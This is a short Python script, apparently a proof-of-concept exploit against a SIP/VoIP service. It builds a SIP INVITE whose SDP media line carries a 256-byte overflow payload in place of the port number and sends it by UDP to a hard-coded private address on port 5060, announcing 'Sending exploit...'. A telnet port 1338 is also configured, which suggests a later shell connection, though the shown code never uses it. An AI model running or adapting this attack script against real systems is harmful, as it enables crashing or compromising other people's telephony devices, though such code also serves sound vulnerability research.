import socket
import telnetlib
from telnetlib import Telnet
from time import sleep
from hexdump import hexdump

from colorama import Fore, Style

options = {
    "server": "10.42.0.138",
    "port": 5060,
    "tnPort": 1338
}

payload = b""
payload += b"a" * 256

sdp = b"""v=0\x0d
o=jdoe 2890844526 2890842807 IN IP4 10.47.16.5\x0d
c=IN IP4 224.2.17.12/127\x0d
t=2873397496 2873404696\x0d
a=recvonly\x0d
m=audio 49170 """ + payload + b"""\x0d\x0a"""


sip = f"""INVITE sip:x  SIP/2.0\x0d
Content-Length: {len(sdp)} \r\n\r\n""".encode() + sdp
print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Payload to send: ')
hexdump(sip)
print(sip)

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('', 5060))
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Establishing connection to {options["server"]}:{options["port"]}')
s.connect((options["server"], options["port"]))
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Connection established!')

print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Sending exploit...')
sent=s.send(sip)
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Exploit sent!')
